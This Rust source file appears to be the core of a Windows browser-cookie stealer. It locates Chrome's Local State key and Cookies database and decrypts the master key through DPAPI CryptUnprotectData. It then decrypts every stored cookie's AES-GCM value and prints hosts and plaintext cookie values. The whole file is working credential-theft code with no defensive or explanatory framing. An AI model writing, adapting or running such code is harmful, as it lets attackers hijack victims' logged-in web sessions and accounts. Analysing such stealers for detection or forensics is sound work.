use std::{env, path::{self, PathBuf}, fs, ptr};

use serde_json;
use base64::{Engine as _, engine::general_purpose};

// SQLITE
use sqlite;

// WINAPI
use winapi::{
    um::{
        winbase,
        dpapi,
        wincrypt
    },
    shared::minwindef
};

// AES_GCM
use aes_gcm::{
    Aes256Gcm, Key,
    aead::{
        Aead, 
        KeyInit, 
        generic_array::GenericArray
    }
};


// struct Cookie {
//     host: String,
//     path:     String,
// 	secure:   bool,
// 	expires:  String,
// 	name:     String,
// 	value:    String,
// 	http_only: bool,
// 	same_site: i32
// }

fn find_chrome_paths() -> (PathBuf, PathBuf) {
    let appdata_path = env::var("APPDATA").unwrap();
    let appdata_path = path::Path::new(appdata_path.as_str());
    let user_data_path = appdata_path.join("../local/Google/Chrome/User Data");
    let key_path = user_data_path.join("Local State");
    let db_path = user_data_path.join("Default/Network/Cookies");
    (key_path, db_path)
}


fn decrypt(keydpapi: &[u8]) -> Result<Vec<u8>, String> {
    // https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
    // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localfree
    // https://docs.rs/winapi/latest/winapi/um/dpapi/index.html
    // https://docs.rs/winapi/latest/winapi/um/winbase/fn.LocalFree.html

    let mut data_in = wincrypt::DATA_BLOB {
        cbData: keydpapi.len() as minwindef::DWORD,
        pbData: keydpapi.as_ptr() as *mut minwindef::BYTE,
    };
    let mut data_out = wincrypt::DATA_BLOB {
        cbData: 0,
        pbData: ptr::null_mut()
    };
    let result = unsafe {
        dpapi::CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out
        )
    };
    if result == 0 {
        return Err("CryptUnprotectData failed".to_string())
    };
    if data_out.pbData.is_null() {
        return Err("CryptUnprotectData returned a null pointer".to_string());
    }
    
    let decrypted_data = unsafe {
        Vec::from_raw_parts(data_out.pbData, data_out.cbData as usize, data_out.cbData as usize)
    };
    unsafe {
        winbase::LocalFree(data_out.pbData as minwindef::HLOCAL);
    };
    Ok(decrypted_data)
}

fn get_v10_key(key64: &str) -> Vec<u8> {
    let keydpapi: Vec<u8> = general_purpose::STANDARD.decode(&key64).unwrap();
    let keydpapi = &keydpapi[5..];
    let v10_key = decrypt(keydpapi).unwrap();
    v10_key
}


fn decrypt_encrypted_value(value: &[u8], key: &[u8]) -> String {
    let value = &value[3..];
    let nonce = &value[..12];
    let ciphertext = &value[12..];

    // Create a new AES block cipher.
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(&key);
    // let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bits; unique per message
    let nonce = GenericArray::from_slice(nonce); // 96-bits; unique per message
    let plaintext = cipher.decrypt(nonce, ciphertext.as_ref()).unwrap();
    let plaintext = String::from_utf8(plaintext).unwrap();
    plaintext
}

fn query_cookies(v10_key: Vec<u8>, db_path: PathBuf) {
    // let mut db_path = db_path.canonicalize().unwrap().as_os_str().to_str().unwrap().to_string();
    // println!("{}", db_path);
    let connection = sqlite::open(db_path).unwrap();
    let query = "
        SELECT host_key, path, is_secure, expires_utc, name, value, encrypted_value, is_httponly, samesite
        FROM cookies;
    ";
    for row in connection
    .prepare(query)
    .unwrap()
    .into_iter()
    .map(|row| row.unwrap()) {
        let encrypted_value = row.read::<&[u8], _>("encrypted_value");
        let decrypted = decrypt_encrypted_value(encrypted_value, &v10_key);
        let host = row.read::<&str, _>("host_key");
        println!("host: {} value: {}", host, decrypted);
    }
}

pub fn get_cookies() {
    let (key, db_path) = find_chrome_paths();
    let content = fs::read_to_string(&key).unwrap();
    let key_dict: serde_json::Value = serde_json::from_str(content.as_str()).expect("Cant read json file");
    let key64 = key_dict.get("os_crypt").unwrap().get("encrypted_key").unwrap().as_str().unwrap();
    println!("{}", key64);
    let v10_key = get_v10_key(key64);
    query_cookies(v10_key, db_path);
}